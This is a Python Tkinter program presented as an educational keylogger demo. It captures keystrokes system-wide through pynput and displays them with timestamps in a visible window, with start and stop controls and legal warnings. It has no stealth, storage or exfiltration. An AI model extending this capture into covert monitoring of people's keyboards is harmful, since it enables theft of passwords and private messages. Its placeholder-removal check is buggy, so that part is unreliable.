#!/usr/bin/env python3
"""
Educational Keylogger GUI with Tkinter

WARNING: For authorized educational/testing use only. 
Do NOT use without permission. Capturing keystrokes on
unauthorized devices is illegal and unethical.
"""

import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime
from pynput import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Educational Keylogger Demo")
        self.root.geometry("800x600")
        
        # Configure main window style
        self.root.configure(bg="#f0f0f0")
        self.root.option_add('*Font', 'Helvetica 10')
        
        # Keylogger state
        self.is_active = False
        self.listener = None
        self.log = []
        self.session_start = None
        
        # Create UI components
        self.create_widgets()
        
    def create_widgets(self):
        """Create and arrange all GUI widgets"""
        # Header frame
        header_frame = tk.Frame(self.root, bg="#2563eb", padx=15, pady=10)
        header_frame.pack(fill="x")
        
        self.title_label = tk.Label(
            header_frame,
            text="Educational Keylogger Demo",
            bg="#2563eb",
            fg="white",
            font=("Helvetica", 14, "bold")
        )
        self.title_label.pack(side="left")
        
        self.status_indicator = tk.Canvas(
            header_frame,
            width=12,
            height=12,
            bg="#ef4444",
            highlightthickness=0,
            bd=0
        )
        self.status_indicator.pack(side="right", padx=5)
        self.status_text = tk.Label(
            header_frame,
            text="Not Active",
            bg="#2563eb",
            fg="white",
            font=("Helvetica", 10)
        )
        self.status_text.pack(side="right")
        
        # Warning label
        warning_frame = tk.Frame(self.root, bg="#2563eb", padx=15, pady=5)
        warning_frame.pack(fill="x")
        warning_label = tk.Label(
            warning_frame,
            text="WARNING: For authorized educational use only. Actual unauthorized use is illegal.",
            bg="#2563eb",
            fg="#d1d5db",
            font=("Helvetica", 8)
        )
        warning_label.pack(side="left")
        
        # Control buttons frame
        control_frame = tk.Frame(self.root, bg="#f0f0f0", padx=15, pady=10)
        control_frame.pack(fill="x")
        
        self.start_button = tk.Button(
            control_frame,
            text="Start Logging",
            bg="#16a34a",
            fg="white",
            activebackground="#22c55e",
            activeforeground="white",
            relief="flat",
            command=self.start_logging
        )
        self.start_button.pack(side="left", padx=5)
        
        self.stop_button = tk.Button(
            control_frame,
            text="Stop Logging",
            bg="#ef4444",
            fg="white",
            activebackground="#f87171",
            activeforeground="white",
            relief="flat",
            state="disabled",
            command=self.stop_logging
        )
        self.stop_button.pack(side="left", padx=5)
        
        self.clear_button = tk.Button(
            control_frame,
            text="Clear Log",
            bg="#57534e",
            fg="white",
            activebackground="#78716c",
            activeforeground="white",
            relief="flat",
            command=self.clear_log
        )
        self.clear_button.pack(side="left", padx=5)
        
        # Stats frame
        stats_frame = tk.Frame(self.root, bg="#e5e5e5", padx=15, pady=10)
        stats_frame.pack(fill="x")
        
        tk.Label(
            stats_frame,
            text=f"Total Keys:",
            bg="#e5e5e5",
            font=("Helvetica", 9, "bold")
        ).pack(side="left", padx=10)
        self.key_count_label = tk.Label(
            stats_frame,
            text="0",
            bg="#e5e5e5",
            font=("Helvetica", 9)
        )
        self.key_count_label.pack(side="left", padx=(0,20))
        
        tk.Label(
            stats_frame,
            text=f"Session Started:",
            bg="#e5e5e5",
            font=("Helvetica", 9, "bold")
        ).pack(side="left", padx=10)
        self.session_label = tk.Label(
            stats_frame,
            text="Not started yet",
            bg="#e5e5e5",
            font=("Helvetica", 9)
        )
        self.session_label.pack(side="left", padx=(0,20))
        
        tk.Label(
            stats_frame,
            text=f"Last Key:",
            bg="#e5e5e5",
            font=("Helvetica", 9, "bold")
        ).pack(side="left", padx=10)
        self.last_key_label = tk.Label(
            stats_frame,
            text="None",
            bg="#e5e5e5",
            font=("Helvetica", 9)
        )
        self.last_key_label.pack(side="left")
        
        # Log display area
        log_frame = tk.Frame(self.root)
        log_frame.pack(fill="both", expand=True, padx=15, pady=(0,15))
        
        # Treeview for key log display
        self.log_tree = ttk.Treeview(
            log_frame,
            columns=("timestamp", "key", "name"),
            show="headings",
            selectmode="browse"
        )
        
        # Configure columns
        self.log_tree.heading("timestamp", text="Timestamp")
        self.log_tree.heading("key", text="Key")
        self.log_tree.heading("name", text="Key Name")
        
        self.log_tree.column("timestamp", width=200, anchor="w")
        self.log_tree.column("key", width=100, anchor="center")
        self.log_tree.column("name", width=400, anchor="w")
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=self.log_tree.yview)
        self.log_tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side="right", fill="y")
        self.log_tree.pack(fill="both", expand=True)
        
        # Style the treeview
        style = ttk.Style()
        style.configure("Treeview", 
                       background="#ffffff",
                       foreground="black",
                       rowheight=25,
                       fieldbackground="#ffffff",
                       font=("Helvetica", 9))
        
        style.configure("Treeview.Heading",
                       background="#3b82f6",
                       foreground="white",
                       font=("Helvetica", 9, "bold"))
        
        style.map("Treeview", background=[("selected", "#60a5fa")])
        
        # Add placeholder text
        self.log_tree.insert("", "end", values=("", "No keys logged yet", "Press 'Start Logging' to begin"))
        
    def start_logging(self):
        """Start the keylogger"""
        if self.is_active:
            return
        
        self.is_active = True
        self.session_start = datetime.now()
        self.session_label.config(text=self.format_datetime(self.session_start))
        
        # Clear placeholder if present
        if self.log_tree.get_children()[0][2] == "Press 'Start Logging' to begin":
            self.log_tree.delete(*self.log_tree.get_children())
        
        # Update UI
        self.update_status(True)
        
        # Start keylogger listener
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        
    def stop_logging(self):
        """Stop the keylogger"""
        if not self.is_active:
            return
        
        self.is_active = False
        self.update_status(False)
        
        if self.listener:
            self.listener.stop()
        
    def clear_log(self):
        """Clear the log"""
        self.log = []
        self.log_tree.delete(*self.log_tree.get_children())
        self.key_count_label.config(text="0")
        self.last_key_label.config(text="None")
        self.session_start = None
        self.session_label.config(text="Not started yet")
        
        # Add placeholder again
        self.log_tree.insert("", "end", values=("", "No keys logged yet", "Press 'Start Logging' to begin"))
    
    def on_key_press(self, key):
        """Callback for key press events"""
        timestamp = datetime.now()
        
        try:
            # For character keys
            key_char = key.char
            key_name = key_char
            display_key = key_char
        except AttributeError:
            # For special keys
            key_char = None
            key_name = str(key)
            # Format special keys nicely
            if "Key." in key_name:
                key_name = key_name.replace("Key.", "")
                if key_name == "space":
                    display_key = "[Space]"
                elif key_name == "enter":
                    display_key = "[Enter]"
                elif key_name == "backspace":
                    display_key = "[Backspace]"
                elif key_name == "tab":
                    display_key = "[Tab]"
                elif key_name == "esc":
                    display_key = "[Esc]"
                else:
                    display_key = f"[{key_name.title()}]"
            else:
                display_key = f"[{key_name}]"
        
        # Add to log
        self.log.append({
            "timestamp": timestamp,
            "key": display_key,
            "name": key_name
        })
        
        # Update UI in main thread
        self.root.after(0, self.update_log_ui, timestamp, display_key, key_name)
    
    def update_log_ui(self, timestamp, key, name):
        """Update the UI with new key press"""
        formatted_time = self.format_time(timestamp)
        
        # Insert new item at the top
        self.log_tree.insert("", "0", values=(formatted_time, key, name))
        
        # Update stats
        self.key_count_label.config(text=str(len(self.log)))
        self.last_key_label.config(text=f"{key} ({name})")
        
        # Auto-scroll to top
        if len(self.log_tree.get_children()) > 1:
            self.log_tree.yview_moveto(0)
    
    def update_status(self, is_active):
        """Update the status indicator"""
        if is_active:
            self.status_indicator.configure(bg="#22c55e")
            self.status_text.configure(text="Active")
            self.start_button.config(state="disabled")
            self.stop_button.config(state="normal")
            
            # Start blinking animation
            self.animate_status()
        else:
            self.status_indicator.configure(bg="#ef4444")
            self.status_text.configure(text="Not Active")
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            
            # Cancel blinking animation if running
            if hasattr(self, "blink_job"):
                self.root.after_cancel(self.blink_job)
    
    def animate_status(self):
        """Create blinking animation for active status"""
        if not self.is_active:
            return
        
        current_color = self.status_indicator.cget("bg")
        new_color = "#86efac" if current_color == "#22c55e" else "#22c55e"
        self.status_indicator.configure(bg=new_color)
        
        self.blink_job = self.root.after(1000, self.animate_status)
    
    def format_datetime(self, dt):
        """Format datetime for display"""
        return dt.strftime("%b %d, %Y %I:%M:%S %p")
    
    def format_time(self, dt):
        """Format time with milliseconds"""
        return dt.strftime("%H:%M:%S.%f")[:-3]

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
